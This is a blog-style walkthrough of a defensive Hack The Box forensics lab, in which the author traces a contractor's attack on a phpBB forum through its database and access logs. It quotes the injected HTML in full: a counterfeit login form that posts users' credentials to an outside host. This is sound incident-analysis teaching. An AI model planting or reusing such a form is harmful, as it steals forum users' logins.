---
layout: page
title: Bumblebee
description: Examined databases and correlated log data.
img: 
importance: 4
category: Sherlocks
team: Blue Team Labs
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-4 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/bumblebee/logo.png" title="HTB Bumblebee" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<h2>Link</h2>
<a href="https://app.hackthebox.com/sherlocks/Bumblebee">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
Looks like a contractor tried to sting us with this Bumblebee box.  Let wing it and take them down.  Let's go!

First things first, extract the tarball archive to get to the db and the logs.

{% capture extracttar %}
┌──(kali㉿kali)-[~/Desktop/bumblebee]
└─$ tar -xvf ../incident.tgz   
./phpbb.sqlite3
access.log
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=extracttar %}

<br />
To kick things off, we need to identify the contractor.  The sqlite3 db seems like a good place to start.  Open it up in sqlitebrowser and let's see what we have.  The phpbb_users table looks like a good place to start.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/bumblebee/opendb.png" title="Open Database" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Now, we have to find a contractor that has rights in the system.  If you notice, apoole1's email has the contractor domain and they have user permission.  This makes them a pretty good candidate.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/bumblebee/finduser.png" title="Find User" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Next, we should probably identify the IP address of the contractor that we are investigating.  In the same record that we were reviewing, there should be an IP address field.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/bumblebee/findip.png" title="Find IP" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Of course, if they made a malicious post to steal creds, we should identify that post.  Open the phpbb_posts table and notice the post beginning with a `<div>` tag that looks like html injection.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/bumblebee/idpost.png" title="Find Post ID" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Copy the contents of the shell and use an online HTML prettier so the markdown is easier to read.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/bumblebee/htmlprettier.png" title="HTML Prettier" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://www.freeformatter.com/html-formatter.html#before-output">https://www.freeformatter.com/html-formatter.html#before-output</a>

<br />
With the prettied form, we can now easily identify the url (http://10.10.0.78/update.php) the form sends its data to to harvest credentials.

{% capture injectedhtml %}
<snip>

            <form action="http://10.10.0.78/update.php" method="post" id="login" data-focus="username" target="hiddenframe">
               <div class="panel">
                  <div class="inner">
                     <div class="content">
                        <h2 class="login-title">Login</h2>
                        <fieldset class="fields1">
                        <dl>
                           <dt><label for="username">Username:</label></dt>
                           <dd><input type="text" tabindex="1" name="username" id="username" size="25" value="" class="inputbox autowidth"></dd>
                        </dl>
                        <dl>
                           <dt><label for="password">Password:</label></dt>
                           <dd><input type="password" tabindex="2" id="password" name="password" size="25" class="inputbox autowidth" autocomplete="off"></dd>
                        </dl>
                        <dl>
                           <dd><label for="autologin"><input type="checkbox" name="autologin" id="autologin" tabindex="4">Remember me</label></dd>
                           <dd><label for="viewonline"><input type="checkbox" name="viewonline" id="viewonline" tabindex="5">Hide my online status this session</label></dd>
                        </dl>
                        <dl>
                           <dt>&nbsp;</dt>
                           <dd>    <input type="submit" name="login" tabindex="6" value="Login" class="button1" onclick="sethidden()"></dd>
                        </dl>
                        </fieldset class="fields1">
                     </div>
                  </div>
               </div>
            </form>

<snip>
{% endcapture %}
{% include terminal.html language='browser' title='Injected HTML' content=injectedhtml %}

<br />
We can also review the phpbb_config table to get the LDAP password.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/bumblebee/ldappassword.png" title="LDAP Password" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Switching to the logs now, we can get th Administrator User-Agent from one of the Administrator's request.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/bumblebee/useragent.png" title="User Agent" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
If we look for a POST request to the i=acp_groups and mode manage, maybe we can identify when the contractor added themself to the administrators group.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/bumblebee/administratorgroup.png" title="Add to Administrator Group" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Find the GET request to the Store directory that grabs the gunzip file.  From here, we can get both the time and size of the backup.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/bumblebee/backup.png" title="Download Backup" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Hopefully we generated a little buzz cracking the Bumblebee Sherlock.  Let me know if you enjoyed the read and I will see you in the next box.